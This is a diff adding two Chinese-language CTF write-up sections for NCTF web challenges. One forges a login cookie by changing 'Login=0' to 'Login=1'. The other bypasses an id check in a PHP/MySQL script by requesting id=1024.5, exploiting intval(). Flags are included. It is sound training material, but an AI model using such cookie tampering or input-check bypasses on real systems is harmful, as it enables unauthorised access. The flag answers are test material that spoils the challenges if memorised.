@@ -10,6 +10,9 @@
 *	[單身一百年也沒用 (150)](#單身一百年也沒用)
 *	[Download~! (200)](#Download~!)
 *	[md5 collision (50)](#md5_collision)
+*	[COOKIE (200)](#COOKIE)
+*	[MYSQL (200)](#MYSQL)
+
 
 <h2 id="AAencode">AAencode (100)</h2>
 
@@ -276,3 +279,79 @@ md5('QNKCDZO') = 0e830400451993494058024219903391
 ```
 
 `nctf{md5_collision_is_easy}`
+
+<h2 id="COOKIE">COOKIE (200)</h2>
+
+TIP: 0 == not
+
+> GET /web10/index.php HTTP/1.1
+> Host: chinalover.sinaapp.com
+> User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:48.0) Gecko/20100101 Firefox/48.0
+> Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+> Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
+> Accept-Encoding: gzip, deflate
+> Referer: http://ctf.nuptsast.com/challenges
+> Cookie: Login=0
+> Connection: close
+> Upgrade-Insecure-Requests: 1
+
+所以 1 == yes 
+
+```
+Cookie: Login=1
+```
+
+送回去
+
+```
+flag:nctf{cookie_is_different_from_session}
+```
+
+<h2 id="MYSQL">MYSQL (200)</h2>
+
+```
+/robots.txt
+```
+
+> robots.txt
+> 存放於網站根目錄下的 ASCII 編碼文字檔案，通常會告訴網路爬蟲，哪些內容是可以被取得的，哪些是不可以取得的。
+
+```php
+别太开心，flag不在这，这个文件的用途你看完了？
+在CTF比赛中，这个文件往往存放着提示信息
+
+TIP:sql.php
+
+<?php
+if($_GET[id]) {
+   mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
+  mysql_select_db(SAE_MYSQL_DB);
+  $id = intval($_GET[id]);
+  $query = @mysql_fetch_array(mysql_query("select content from ctf2 where id='$id'"));
+  if ($_GET[id]==1024) {
+      echo "<p>no! try again</p>";
+  }
+  else{
+    echo($query[content]);
+  }
+}
+?>
+```
+
+> intval(): 取得變量的整數值（不能用於 array 或 object）
+
+```
+http://chinalover.sinaapp.com/web11/sql.php?id=1023
+```
+no msg in 1023~~~
+
+```
+http://chinalover.sinaapp.com/web11/sql.php?id=1024
+```
+no! try again
+
+```
+http://chinalover.sinaapp.com/web11/sql.php?id=1024.5
+```
+
+`the flag is:nctf{query_in_mysql}`
